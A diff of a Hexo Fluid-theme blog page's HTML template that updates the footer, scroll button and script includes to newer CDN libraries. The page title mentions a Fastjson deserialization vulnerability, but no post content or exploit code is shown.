+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
 
 
     
-  </main>
 
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
      aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
@@ -418,194 +627,185 @@
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-  
 
-  
+    
 
-  
+    
+  </main>
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
-    
-
-    
-
-    
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
-<script  src="/js/main.js" ></script>
-
-
-  <script  src="/js/lazyload.js" ></script>
-
-
-
   
-  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
   <script>
-    $(document).ready(function () {
-      var navHeight = $('#navbar').height();
-      var toc = $('#toc');
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-      var tocLimMax = 2 * boardTop + boardCtn.height();
-
-      $(window).scroll(function () {
-        var tocLimMin = $('#toc-start').offset().top - navHeight;
-        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
-
-        if (tocLimMin <= scroH && scroH <= tocLimMax) {
-          toc.css({
-            'display': 'block',
-            'position': 'fixed',
-            'top': navHeight,
-          });
-        } else if (scroH <= tocLimMin) {
-          toc.css({
-            'position': '',
-            'top': '',
-          });
-        } else if (scroH > tocLimMax) {
-          toc.css('display', 'none');
-        }
-      });
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '.post-content',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc > p').css('visibility', 'visible');
-      }
-      var offset = boardCtn.css('margin-right')
-      $('#toc-ctn').css({
-        'right': offset
-      })
-    });
-  </script>
-
-
-
-
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-<!-- Plugins -->
-
-
-
-  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
     })
   </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
   <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "Java反序列化漏洞-Fastjson&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
       
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
+        typing(text);
+      
+    })(window, document);
   </script>
 
 
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
 
 
 
 
 
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
+  
 
-
-
-
-
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
